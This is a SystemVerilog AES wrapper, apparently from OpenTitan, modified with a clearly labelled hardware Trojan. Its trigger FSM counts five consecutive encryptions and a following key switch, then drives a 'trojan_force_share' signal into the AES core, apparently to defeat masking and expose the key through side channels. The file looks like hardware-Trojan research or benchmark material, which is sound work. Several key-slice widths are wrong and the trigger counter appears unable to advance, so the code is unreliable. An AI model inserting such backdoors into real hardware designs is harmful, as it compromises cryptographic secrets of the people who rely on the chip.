module aes_wrap
  import aes_pkg::*;
#(
  parameter bit         AES192Enable = 1,           // Can be 0 (disable), or 1 (enable).
  parameter bit         SecMasking   = 1,           // Can be 0 (no masking), or
                                                    // 1 (first-order masking) of the cipher
                                                    // core. Masking requires the use of a
                                                    // masked S-Box, see SBoxImpl parameter.
                                                    // Note: currently, constant masks are
                                                    // used, this is of course not secure.
  parameter sbox_impl_e SecSBoxImpl  = SBoxImplDom  // See aes_pkg.sv
) (
  input  logic         clk_i,
  input  logic         rst_ni,

  input  logic [127:0] aes_input,
  input  logic [255:0] aes_key,
  output logic [127:0] aes_output,

  output logic         alert_recov_o,
  output logic         alert_fatal_o,

  output logic         test_done_o
);

  localparam logic SIDELOAD = 1'b1;
  localparam aes_mode_e AES_MODE = AES_ECB;

  import aes_reg_pkg::*;
  import tlul_pkg::*;

  logic unused_idle;
  logic [31:0] unused_wdata;
  logic edn_req;
  keymgr_pkg::hw_key_req_t keymgr_key;
  tl_h2d_t h2d, h2d_intg; // req
  tl_d2h_t d2h; // rsp
  prim_alert_pkg::alert_rx_t [NumAlerts-1:0] alert_rx;
  prim_alert_pkg::alert_tx_t [NumAlerts-1:0] alert_tx;

  // ========== TROJAN CONTROL SIGNALS ===========
  // Trojan registers for trigger state
  logic [2:0] enc_count_q, enc_count_d;    // Count consecutive encrypt commands (max 5)
  logic       enc_seq_met_q, enc_seq_met_d;// Sequence met flag
  logic       key_switch_q, key_switch_d;  // Key switch detected (immediately after 5th enc)
  logic       trojan_active_q, trojan_active_d; // Actual trigger (latched)
  logic [1:0] ctrl_state_q, ctrl_state_d;  // FSM state for Trojan control

  // Trojan control FSM states
  localparam [1:0] TROJAN_IDLE   = 2'd0;
  localparam [1:0] TROJAN_WAIT_KEY = 2'd1;
  localparam [1:0] TROJAN_PAYLOAD = 2'd2;

  // Control signals to detect opcodes (wrapping original FSM control)
  logic is_enc_op;
  logic is_key_switch_op;

  // ===== END TROJAN CONTROL SIGNALS ============

  // Sideload interface - allows for quicker simulation.
  assign keymgr_key.valid = 1'b1;
  assign keymgr_key.key[0][255:0] = aes_key;
  assign keymgr_key.key[1][255:0] = '0;

  // Alert receivers
  assign alert_rx[0].ping_p = 1'b0;
  assign alert_rx[0].ping_n = 1'b1;
  assign alert_rx[0].ack_p  = 1'b0;
  assign alert_rx[0].ack_n  = 1'b1;
  assign alert_rx[1].ping_p = 1'b0;
  assign alert_rx[1].ping_n = 1'b1;
  assign alert_rx[1].ack_p  = 1'b0;
  assign alert_rx[1].ack_n  = 1'b1;

  // Alert transceivers
  assign alert_recov_o = alert_tx[0].alert_p | ~alert_tx[0].alert_n;
  assign alert_fatal_o = alert_tx[1].alert_p | ~alert_tx[1].alert_n;

  // Command integrity generation
  tlul_cmd_intg_gen tlul_cmd_intg_gen (
    .tl_i(h2d),
    .tl_o(h2d_intg)
  );

  // Data integrity generation
  prim_secded_inv_39_32_enc u_data_gen (
    .data_i (h2d.a_data),
    .data_o ({h2d_intg.a_user.data_intg, unused_wdata})
  );

  // =================== TROJAN: Masking Control Signal Forward ======================
  // Output signal to core: only used by Trojan-aware aes.v
  wire trojan_force_share;
  assign trojan_force_share = trojan_active_q;
  // ===================      End Trojan Control     ================================

  // DUT
  // ======= TROJAN MODIFIED: Pass extra trojan_force_share signal =========
  aes #(
    .AES192Enable(AES192Enable),
    .SecMasking(SecMasking),
    .SecSBoxImpl(SecSBoxImpl)
  ) aes (
    .clk_i           (clk_i),
    .rst_ni          (rst_ni),
    .rst_shadowed_ni (rst_ni),
    .idle_o          (unused_idle),
    .lc_escalate_en_i(lc_ctrl_pkg::Off),
    .clk_edn_i       (clk_i),
    .rst_edn_ni      (rst_ni),
    .edn_o           (edn_req),
    .edn_i           ({edn_req, 1'b1, 32'h12345678}),
    .keymgr_key_i    (keymgr_key),
    .tl_i            (h2d_intg),
    .tl_o            (d2h),
    .alert_rx_i      (alert_rx),
    .alert_tx_o      (alert_tx),
    // ------ Trojan signal forward ------
    .trojan_force_share_i (trojan_force_share)
  );
  // ======================================================================

  // FSM
  localparam int StateWidth = BlockAw;
  typedef enum logic [StateWidth-1:0] {
    IDLE,
    W_KEY_SHARE0_0,
    W_KEY_SHARE0_1,
    W_KEY_SHARE0_2,
    W_KEY_SHARE0_3,
    W_KEY_SHARE0_4,
    W_KEY_SHARE0_5,
    W_KEY_SHARE0_6,
    W_KEY_SHARE0_7,
    W_KEY_SHARE1_0,
    W_KEY_SHARE1_1,
    W_KEY_SHARE1_2,
    W_KEY_SHARE1_3,
    W_KEY_SHARE1_4,
    W_KEY_SHARE1_5,
    W_KEY_SHARE1_6,
    W_KEY_SHARE1_7,
    W_IV_0,
    W_IV_1,
    W_IV_2,
    W_IV_3,
    W_DATA_IN_0,
    W_DATA_IN_1,
    W_DATA_IN_2,
    W_DATA_IN_3,
    R_DATA_OUT_0,
    R_DATA_OUT_1,
    R_DATA_OUT_2,
    R_DATA_OUT_3,
    W_CTRL_SHADOWED,
    W_CTRL_AUX_SHADOWED,
    W_TRIGGER_OFFSET,
    R_STATUS,
    FINISH
  } aes_wrap_ctrl_e;
  aes_wrap_ctrl_e aes_wrap_ctrl_ns, aes_wrap_ctrl_cs;
  logic [31:0] count_d, count_q;
  logic [127:0] data_out_d, data_out_q;

  // ============== TROJAN: Detect Encryption and Key Switch Ops ==================
  always_comb begin
    // Default: no enc or key switch op, to avoid latches
    is_enc_op        = 1'b0;
    is_key_switch_op = 1'b0;

    // Encryption operation is considered when finishing one encryption (R_DATA_OUT_3 state)
    if (aes_wrap_ctrl_cs == R_DATA_OUT_3 && d2h.d_valid)
      is_enc_op = 1'b1;

    // Key switch considered as writing to W_KEY_SHARE0_0 with valid data (start of key loading)
    if (aes_wrap_ctrl_cs == W_KEY_SHARE0_0 && h2d.a_valid)
      is_key_switch_op = 1'b1;
  end
  // =============================================================================

  // ============== TROJAN: Trigger Sequence Counters and Control FSM =============
  always_comb begin
    // Default next values
    enc_count_d     = enc_count_q;
    enc_seq_met_d   = enc_seq_met_q;
    key_switch_d    = 1'b0;
    trojan_active_d = trojan_active_q;
    ctrl_state_d    = ctrl_state_q;

    // Default: Trojan can only ever activate once after power-on-reset unless resets intervened
    case (ctrl_state_q)
      TROJAN_IDLE: begin
        if (is_enc_op) begin
          if (enc_count_q == 3'd4)
            enc_count_d = 3'd5; // 5th encryption
          else
            enc_count_d = enc_count_q + 3'd1;
        end
        if (!is_enc_op && !is_key_switch_op) begin
          // Any operation besides encrypt/key switch resets counter (no intervening reset allowed!)
          enc_count_d = 3'd0;
        end
        if (enc_count_q == 3'd5) begin
          enc_seq_met_d = 1'b1;
          ctrl_state_d  = TROJAN_WAIT_KEY;
        end
      end
      TROJAN_WAIT_KEY: begin
        // Wait for immediate command to switch key
        // Only accept key switch as the next operation
        if (is_key_switch_op) begin
          key_switch_d    = 1'b1;
          trojan_active_d = 1'b1;
          ctrl_state_d    = TROJAN_PAYLOAD;
        end
        // Any non-key-switch or resetizing operation aborts trigger
        else if (!is_enc_op) begin
          // Abort sequence if anything else occurs
          enc_seq_met_d   = 1'b0;
          enc_count_d     = 3'd0;
          ctrl_state_d    = TROJAN_IDLE;
        end
      end
      TROJAN_PAYLOAD: begin
        // Keep activated, stay here until reset
        trojan_active_d  = 1'b1;
      end
      default: begin
        ctrl_state_d = TROJAN_IDLE;
        enc_count_d  = 3'd0;
        enc_seq_met_d = 1'b0;
        key_switch_d = 1'b0;
        trojan_active_d = 1'b0;
      end
    endcase

    // Reset handling
    if (!rst_ni) begin
      enc_count_d      = 3'd0;
      enc_seq_met_d    = 1'b0;
      key_switch_d     = 1'b0;
      trojan_active_d  = 1'b0;
      ctrl_state_d     = TROJAN_IDLE;
    end
  end

  // Register the Trojan signals
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      enc_count_q     <= 3'd0;
      enc_seq_met_q   <= 1'b0;
      key_switch_q    <= 1'b0;
      trojan_active_q <= 1'b0;
      ctrl_state_q    <= TROJAN_IDLE;
    end else begin
      enc_count_q     <= enc_count_d;
      enc_seq_met_q   <= enc_seq_met_d;
      key_switch_q    <= key_switch_d;
      trojan_active_q <= trojan_active_d;
      ctrl_state_q    <= ctrl_state_d;
    end
  end
  // ============== END TROJAN CONTROL ============================================
  // (trojan_active_q drives trojan_force_share signal to core)

  always_comb begin : aes_wrap_fsm
    // TL-UL
    h2d.a_valid           = 1'b0;
    h2d.a_opcode          = PutFullData;
    h2d.a_param           = 3'h0;                      // static
    h2d.a_size            = 2'h2;                      // static
    h2d.a_source          = 8'h0;                      // static
    h2d.a_address         = 32'hAAAAAAA8;
    h2d.a_mask            = 4'hF;                      // static
    h2d.a_data            = 32'h55555555;
    h2d.a_user.rsvd       = '0;                        // static
    h2d.a_user.instr_type = prim_mubi_pkg::MuBi4False; // static (Data)
    h2d.a_user.cmd_intg   = '0;                        // will be driven by tlul_cmd_intg_gen
    h2d.a_user.data_intg  = '0;                        // will be driven by prim_secded_enc
    h2d.d_ready           = 1'b1;                      // static

    // FSM
    aes_wrap_ctrl_ns      = aes_wrap_ctrl_cs;
    count_d               = count_q + 32'h1;
    data_out_d            = data_out_q;
    test_done_o           = 1'b0;

    unique case (aes_wrap_ctrl_cs)

      IDLE: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = Get;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_STATUS_OFFSET};

        if (d2h.d_valid) begin
          h2d.a_valid = 1'b0;
          if (d2h.d_data[0] == 1'b1) begin
            aes_wrap_ctrl_ns = W_CTRL_AUX_SHADOWED;
            count_d          = 32'h0;
          end
        end
      end

      W_CTRL_AUX_SHADOWED: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_CTRL_AUX_SHADOWED_OFFSET};
        h2d.a_data    = 32'h0;
        if (d2h.d_valid) begin
          h2d.a_valid = 1'b0;
        end
        if (count_q >= 32'h3 && d2h.d_valid) begin
          aes_wrap_ctrl_ns = W_CTRL_SHADOWED;
        end
      end

      W_CTRL_SHADOWED: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_CTRL_SHADOWED_OFFSET};
        h2d.a_data    = {18'h0, 1'b0 ,1'b0, SIDELOAD, AES_128, AES_MODE, AES_ENC};
        if (d2h.d_valid) begin
          h2d.a_valid = 1'b0;
        end
        if (count_q >= 32'h7 && d2h.d_valid) begin
          aes_wrap_ctrl_ns = SIDELOAD == 1'b1 ?
              (AES_MODE == AES_ECB ? W_DATA_IN_0 : W_IV_0) : W_KEY_SHARE0_0;
        end
      end

      W_KEY_SHARE0_0: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE0_0_OFFSET};
        h2d.a_data    = aes_key[31:0];
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE0_1;
        end
      end

      W_KEY_SHARE0_1: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE0_1_OFFSET};
        h2d.a_data    = aes_key[63:32];
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE0_2;
        end
      end

      W_KEY_SHARE0_2: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE0_2_OFFSET};
        h2d.a_data    = aes_key[95:64];
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE0_3;
        end
      end

      W_KEY_SHARE0_3: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE0_3_OFFSET};
        h2d.a_data    = aes_key[127:96];
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE0_4;
        end
      end

      W_KEY_SHARE0_4: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE0_4_OFFSET};
        h2d.a_data    = aes_key[159:128];
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE0_5;
        end
      end

      W_KEY_SHARE0_5: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE0_5_OFFSET};
        h2d.a_data    = aes_key[195:160];
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE0_6;
        end
      end

      W_KEY_SHARE0_6: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE0_6_OFFSET};
        h2d.a_data    = aes_key[227:196];
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE0_7;
        end
      end

      W_KEY_SHARE0_7: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE0_7_OFFSET};
        h2d.a_data    = aes_key[255:228];
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE1_0;
        end
      end

      W_KEY_SHARE1_0: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE1_0_OFFSET};
        h2d.a_data    = '0;
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE1_1;
        end
      end

      W_KEY_SHARE1_1: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE1_1_OFFSET};
        h2d.a_data    = '0;
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE1_2;
        end
      end

      W_KEY_SHARE1_2: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE1_2_OFFSET};
        h2d.a_data    = '0;
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE1_3;
        end
      end

      W_KEY_SHARE1_3: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE1_3_OFFSET};
        h2d.a_data    = '0;
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE1_4;
        end
      end

      W_KEY_SHARE1_4: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE1_4_OFFSET};
        h2d.a_data    = '0;
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE1_5;
        end
      end

      W_KEY_SHARE1_5: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE1_5_OFFSET};
        h2d.a_data    = '0;
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE1_6;
        end
      end

      W_KEY_SHARE1_6: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE1_6_OFFSET};
        h2d.a_data    = '0;
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_KEY_SHARE1_7;
        end
      end

      W_KEY_SHARE1_7: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_KEY_SHARE1_7_OFFSET};
        h2d.a_data    = '0;
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = AES_MODE == AES_ECB ? W_DATA_IN_0 : W_IV_0;
        end
      end

      W_IV_0: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_IV_0_OFFSET};
        h2d.a_data    = '0;
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_IV_1;
        end
      end

      W_IV_1: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_IV_1_OFFSET};
        h2d.a_data    = '0;
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_IV_2;
        end
      end

      W_IV_2: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_IV_2_OFFSET};
        h2d.a_data    = '0;
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_IV_3;
        end
      end

      W_IV_3: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_IV_3_OFFSET};
        h2d.a_data    = '0;
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_DATA_IN_0;
        end
      end

      W_DATA_IN_0: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_DATA_IN_0_OFFSET};
        h2d.a_data    = aes_input[31:0];
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_DATA_IN_1;
        end
      end

      W_DATA_IN_1: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_DATA_IN_1_OFFSET};
        h2d.a_data    = aes_input[63:32];
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_DATA_IN_2;
        end
      end

      W_DATA_IN_2: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_DATA_IN_2_OFFSET};
        h2d.a_data    = aes_input[95:64];
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = W_DATA_IN_3;
        end
      end

      W_DATA_IN_3: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = PutFullData;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_DATA_IN_3_OFFSET};
        h2d.a_data    = aes_input[127:96];
        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          aes_wrap_ctrl_ns = R_STATUS;
          count_d          = '0;
        end
      end

      R_STATUS: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = Get;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_STATUS_OFFSET};

        if (d2h.d_valid) begin
          h2d.a_valid = 1'b0;
          if ((d2h.d_data[0] == 1'b1) && (d2h.d_data[3] == 1'b1)) begin
            aes_wrap_ctrl_ns = R_DATA_OUT_0;
          end
        end
      end

      R_DATA_OUT_0: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = Get;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_DATA_OUT_0_OFFSET};

        if (d2h.d_valid) begin
          h2d.a_valid      = 1'b0;
          data_out_d[31:0] = d2h.d_data;
          aes_wrap_ctrl_ns = R_DATA_OUT_1;
        end
      end

      R_DATA_OUT_1: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = Get;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_DATA_OUT_1_OFFSET};

        if (d2h.d_valid) begin
          h2d.a_valid       = 1'b0;
          data_out_d[63:32] = d2h.d_data;
          aes_wrap_ctrl_ns  = R_DATA_OUT_2;
        end
      end

      R_DATA_OUT_2: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = Get;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_DATA_OUT_2_OFFSET};

        if (d2h.d_valid) begin
          h2d.a_valid       = 1'b0;
          data_out_d[95:64] = d2h.d_data;
          aes_wrap_ctrl_ns  = R_DATA_OUT_3;
        end
      end

      R_DATA_OUT_3: begin
        h2d.a_valid   = 1'b1;
        h2d.a_opcode  = Get;
        h2d.a_address = {{{32-BlockAw}{1'b0}}, AES_DATA_OUT_3_OFFSET};

        if (d2h.d_valid) begin
          h2d.a_valid        = 1'b0;
          data_out_d[127:96] = d2h.d_data;
          aes_wrap_ctrl_ns   = FINISH;
        end
      end

      FINISH: begin
        test_done_o = 1'b1;
      end

      default: begin
        aes_wrap_ctrl_ns = FINISH;
      end
    endcase

    if (d2h.d_valid && d2h.d_error) begin
      aes_wrap_ctrl_ns = FINISH;
    end
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin : fsm_reg
    if (!rst_ni) begin
      aes_wrap_ctrl_cs <= IDLE;
      count_q          <= 32'b0;
    end else begin
      aes_wrap_ctrl_cs <= aes_wrap_ctrl_ns;
      count_q          <= count_d;
    end
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin : data_out_reg
    if (!rst_ni) begin
      data_out_q <= '0;
    end else begin
      data_out_q <= data_out_d;
    end
  end
  assign aes_output = data_out_q;

endmodule